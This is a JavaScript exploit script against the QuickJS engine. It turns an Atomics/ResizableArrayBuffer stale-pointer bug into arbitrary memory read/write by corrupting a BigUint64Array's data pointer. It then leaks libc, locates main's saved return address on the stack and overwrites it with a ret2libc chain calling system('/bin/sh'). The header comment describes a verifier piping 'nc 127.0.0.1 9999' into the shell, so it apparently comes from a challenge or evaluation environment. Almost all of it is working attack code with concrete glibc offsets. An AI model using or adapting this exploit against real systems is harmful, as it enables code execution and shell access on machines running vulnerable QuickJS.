// exec-shell-relro exploit for QuickJS Atomics RAB stale pointer bug
//
// Key idea: use the Atomics+ResizableArrayBuffer stale-pointer bug to corrupt a BigUint64Array
// object's internal data pointer (JSObject.u.array.u.ptr), yielding arbitrary 64-bit read/write.
// Then locate the saved return address of main on the stack and replace it with a small ret2libc
// chain to call system("/bin/sh"). The verifier feeds the command "nc 127.0.0.1 9999" on stdin;
// the spawned /bin/sh reads and executes it, producing the callback.

'use strict';

const U64_MASK = (1n << 64n) - 1n;
function u64(x) { return x & U64_MASK; }

// -------------------- libc pointer leak (unsorted bin) --------------------
function leak_libc_ptr() {
  const L1 = 0x3000;
  const L2 = 0x20;
  let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
  let ta = new BigInt64Array(rab);
  let evil = { valueOf() { rab.resize(L2); return 0n; } };
  return u64(Atomics.add(ta, 6, evil));
}

// -------------------- arbitrary u64 view via JSObject.u.array.u.ptr corruption --------------------
function make_arb_u64_view(base_addr, backing_bytes) {
  let backing = new ArrayBuffer(backing_bytes);
  let victim;

  const L1 = 0x70;
  const L2 = 0x20;
  let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
  let ta = new BigInt64Array(rab);

  let evil = {
    valueOf() {
      rab.resize(L2);
      victim = new BigUint64Array(backing);
      return base_addr;
    }
  };

  // stale ptr offset 0x68 -> JSObject.u.array.u.ptr
  Atomics.store(ta, 13, evil);
  return { backing, victim, base: base_addr };
}

// -------------------- find libc base by scanning for ELF header --------------------
function find_libc_base(leak) {
  let leakPage = leak & ~0xfffn;
  const scan = 0x400000; // 4MB
  let start = leakPage - BigInt(scan);

  let mem = make_arb_u64_view(start, scan + 0x2000);
  for (let off = scan; off >= 0; off -= 0x1000) {
    let w = mem.victim[off >> 3];
    if ((w & 0xffffffffn) === 0x464c457fn)
      return start + BigInt(off);
  }
  return 0n;
}

// -------------------- constants (glibc 2.41 in this environment) --------------------
const OFF_SYSTEM = 0x53110n;
const OFF_BINSH  = 0x1a7ea4n;
const OFF_POP_RDI_RET = 0x2a145n;
const OFF_RET = 0x2846bn;

// libc relocation slot for _dl_argv (readelf -Wr libc.so.6 | grep _dl_argv)
const OFF__dl_argv_GOT = 0x1e6dd0n;

// main return address value: __libc_init_first call *%rax at 0x29ca6, return to 0x29ca8
const OFF_MAIN_RETADDR_VALUE = 0x29ca8n;

function pwn() {
  let leak = leak_libc_ptr();
  let libcBase = find_libc_base(leak);
  if (libcBase === 0n)
    return;

  // libc view (covers .got and early .text)
  let libcView = make_arb_u64_view(libcBase, 0x600000);

  // _dl_argv address in ld-linux, via libc GOT
  let dl_argv_addr = u64(libcView.victim[Number(OFF__dl_argv_GOT >> 3n)]);

  // argv pointer on the stack
  let ldView = make_arb_u64_view(dl_argv_addr & ~7n, 0x1000);
  let argv_ptr = u64(ldView.victim[0]);

  // Map a 4MB window ending at argv_ptr (contains main's saved return address)
  const stackScan = 0x400000;
  let stackBase = (argv_ptr - BigInt(stackScan)) & ~7n;
  let stackView = make_arb_u64_view(stackBase, stackScan);

  let target = libcBase + OFF_MAIN_RETADDR_VALUE;

  // There are a few copies of this value in the initial stack area.
  // The real saved return address of main is the one at the HIGHEST stack address,
  // so scan from the end backwards.
  const n = stackScan >> 3;
  let ret_i = -1;
  for (let i = n - 4; i >= 0; i--) {
    if (stackView.victim[i] === target) {
      ret_i = i;
      break;
    }
  }
  if (ret_i < 0)
    return;

  // ret2libc: ret; pop rdi; ret; "/bin/sh"; system
  let ret_gadget = libcBase + OFF_RET;
  let pop_rdi_ret = libcBase + OFF_POP_RDI_RET;
  let binsh = libcBase + OFF_BINSH;
  let system = libcBase + OFF_SYSTEM;

  stackView.victim[ret_i + 0] = ret_gadget;
  stackView.victim[ret_i + 1] = pop_rdi_ret;
  stackView.victim[ret_i + 2] = binsh;
  stackView.victim[ret_i + 3] = system;
}

pwn();
